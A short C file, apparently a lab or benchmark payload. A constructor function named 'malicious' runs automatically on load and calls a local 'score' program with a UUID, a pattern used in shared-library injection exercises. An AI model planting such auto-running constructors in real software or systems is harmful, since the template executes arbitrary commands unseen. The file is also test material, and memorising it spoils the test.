#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 154ace98-b85e-4210-abf8-8d78d427ff07");
}
